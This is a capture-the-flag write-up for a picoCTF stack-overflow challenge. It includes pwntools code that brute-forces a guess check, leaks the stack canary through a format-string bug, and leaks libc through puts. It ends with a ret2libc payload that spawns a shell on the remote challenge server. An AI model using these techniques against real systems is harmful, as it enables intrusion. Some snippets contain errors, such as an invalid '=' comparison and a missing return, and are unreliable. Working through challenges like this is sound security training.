# Challenge
This is a basic stack overflow challenge with a few mitigations.
These mitigations are dep and canaries.
The majority of the challenge revolves around bypassing these mitigations and then doing a ret2libc payload.
# Breakdown of Challenge Source Code
This writeup will be organized around the different challenges to solve.
The challenge presented is contained within this source code:
## The \"do_stuff\" Function
```c
int do_stuff() {
	long ans = (get_random() % 4096) + 1;
	int res = 0;
	
	printf("What number would you like to guess?\n");
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);
	
	long g = atol(guess);
	if (!g) {
		printf("That's not a valid number!\n");
	} else {
		if (g == ans) {
			printf("Congrats! You win! Your prize is this print statement!\n\n");
			res = 1;
		} else {
			printf("Nope!\n\n");
		}
	}
	return res;
}
```
In this code it gets a random value from the \"get_random\" function, and returns 1 or true if they are the same.
## The \"get_random\" Function
```c
long get_random() {
	return rand;
}
```
This will get a random number because it basically returns a memory address.
Strange, but it does return a random value as advertised.
All of this code comes together in the main function.
## The \"main\" Function
```c
int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	
	int res;
	
	printf("Welcome to my guessing game!\n");
	printf("Version: %x\n\n", get_version());
	
	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}
	
	return 0;
}
```
With all of this code, it collects a random number, and if the number is correct, then it will call \"win\".
## The \"win\" Function
```c
void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	gets(winner);
	printf("Congrats: ");
	printf(winner);
	printf("\n\n");
}
```
This is the most important function.
It has the printf vuln which allows the attacker to bypass the canary, and it has the gets which allows the adjacent overwrite.
To get to this, the random check needs to get solved.
# Discovering the Random Value
ASLR is disabled, and as a result the memory address won't change.
With that in mind it's time to discover the value.
## Code to Bruteforce the Random Value
```python
def beat_rand(io):
    guess = -4096
    response = ""
    io.recvuntil("?")
    io.sendline(str(guess))
    io.recvline()
    response = io.recvline()
    guess += 1
    while "Nope" in response.decode() and guess < 4097:
        io.recvuntil("?")
        io.sendline(str(guess))
        io.recvline()
        response = io.recvline()
        print(f"used: {guess}", end="\r", flush=True)
        guess += 1
    return guess+1

def beat_rand_local():
    with pwn.process(binary) as io:
        return beat_rand(io)

def beat_rand_remote():
    with pwn.remote("jupiter.challenges.picoctf.org", 43578) as io:
        beat_rand(io)

def main():
    rand_local = beat_rand_local()
    print(f"The random value is {rand_local}")
    rand_remote = beat_rand_remote()
    print(f"The random value is {rand_remote}")

if __name__ = "__main__":
    main()
```
Code along these lines can beat the random check and get the values.
The local value is -2527, and the remote value is -3727.
Now it's time to leak the canary.
# Leaking the Canary
The only method for leaking the canary is utilizing the printf in order to leak the canary.
## Code to Leak the Canary
```python
def leak_stack_row(io, i):
    io.sendline(str(remote_guess))
    io.sendline(f"%{i}$lx")
    io.recvuntil("Congrats: ")
    result = io.recvline().decode()
    return result 

def leak_canary(io):
    # printf, canary
    return leak_stack_row(io, 135)
```
This works in two parts.
The first part is the format string lx.
That allows the printf to get the ith value on the stack.
If the canary is the 135th row on the stack, then supply that number and get it directly.
The \"leak_canary\" function simply calls the \"leak_stack_row\" function with 135 as the argument.
# Leaking Libc 
To leak libc, puts call to puts will be used.
This will consist of the payload to cause the leak, and the code to collect the leak.
## Code to Leak Canary
```python
def leak_puts(io):
    result = leak_canary(io)
    canary = result
    print(f"Canary = {canary}")
    payload = pwn.flat(
        b"A"*padding_canary,
        pwn.pack(int(canary, 16)),
        b"A"*(padding-padding_canary-4),
        pwn.pack(elf.plt["puts"]),
        pwn.pack(elf.symbols["main"]),
        pwn.pack(elf.got["puts"])
    )
    io.sendline(str(remote_guess))
    io.sendline(payload)
    for x in range(7):
        io.recvline()
    leak = io.recv(4)
    leak = pwn.u32(leak)
    return leak
```
This payload leaks the canary, and then collects the first 4 bytes of the output.
This is important because there will be 8 bytes of output.
The first 4 are the got entry of puts.
It also decodes this into a useable memory address in the code.
# LIBC Calculations
To get the remote libc the address of puts will be places into libc.rip.
The libc found is \"libc6-i386_2.27-3ubuntu1.6_amd64.so\".
With all of this information it's time to calculate the addresses.
## Code to Calculate LIBC Addresses
```python
    libc_base = puts - lib.symbols["puts"] 
    binsh = libc_base + next(lib.search(b"/bin/sh")) 
    system = libc_base + lib.symbols["system"] 
```
This calculates the addresses to the different functions and addresses by finding the base address, and then adding the offsets from the libc itself.
# Final Payload
## Code for Payload
```python
    with pwn.remote("jupiter.challenges.picoctf.org", 43578) as io:
        puts = leak_puts(io)
        result = leak_canary(io)
        canary = result
        print(f"Canary = {canary}")
        print(f"Puts = {hex( puts )}")
        libc_base = puts - lib.symbols["puts"] 
        binsh = libc_base + next(lib.search(b"/bin/sh")) 
        system = libc_base + lib.symbols["system"] 
        payload = pwn.flat(
            b"A"*padding_canary,
            pwn.pack(int(canary,16)),
            b"A"*(padding-padding_canary-4),
            pwn.pack(system),
            pwn.pack(0x0),
            pwn.pack(binsh)
        )
        io.sendline(str(remote_guess))
        io.sendline(payload)
        io.interactive()
```
This pulls everything together.
It leaks the canary and libc addresses.
Then, it puts everything into a final payload and drops the shell.